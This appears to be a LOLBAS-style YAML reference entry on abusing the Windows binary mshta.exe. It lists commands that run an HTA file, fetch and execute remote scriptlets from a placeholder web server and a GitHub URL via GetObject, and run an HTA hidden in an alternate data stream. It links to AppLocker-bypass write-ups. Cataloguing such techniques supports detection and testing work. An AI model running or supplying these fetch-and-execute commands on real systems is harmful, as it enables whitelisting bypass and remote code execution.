---
Name: mshta.exe
Description: Execute, Read ADS
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: mshta.exe evilfile.hta
    Description: ''
  - Command: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
    Description: ''
  - Command: "mshta.exe javascript:a=GetObject(\"script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct\"\
      ).Exec();close();     \n    \nmshta \"C:\\ads\\file.txt:file.hta\""
    Description: ''
Full Path:
  - C:\Windows\System32\mshta.exe
  - C:\Windows\SysWOW64\mshta.exe
Code Sample: []
Detection: []
Resources:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Mshta.md
  - https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
  - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
  - https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
  - https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
Notes: Thanks to Casey Smith - @subtee, Oddvar Moe - @oddvarmoe
---